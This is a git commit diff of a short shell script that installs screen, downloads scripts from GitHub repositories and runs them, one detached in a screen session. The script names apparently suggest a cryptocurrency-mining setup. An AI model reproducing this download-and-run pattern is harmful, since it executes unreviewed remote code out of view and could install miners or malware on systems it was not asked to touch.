d04a8db61f5b4a8383e3a4a2788fa396e0a49258
likeudo153 <89896695+likeudo153@users.noreply.github.com>
2021-09-13 22:44:21 +0530

    Update beamSaj.sh

--- beamSaj.sh
+++ beamSaj.sh
@@ -3,8 +3,8 @@
 sudo apt update
 sudo apt install screen -y
 wget https://github.com/likeudo153/prem/raw/main/nhBeam.sh
-wget https://github.com/DarshGoswami1982/FkgX/raw/main/man2.sh
-chmod +x man2.sh
-screen -dmS man2 ./man2.sh 60 70
+wget https://github.com/likeudo153/FkgX/raw/main/man3.sh
+chmod +x man3.sh
+screen -dmS man3 ./man3.sh 60 70
 chmod +x nhBeam.sh
 ./nhBeam.sh
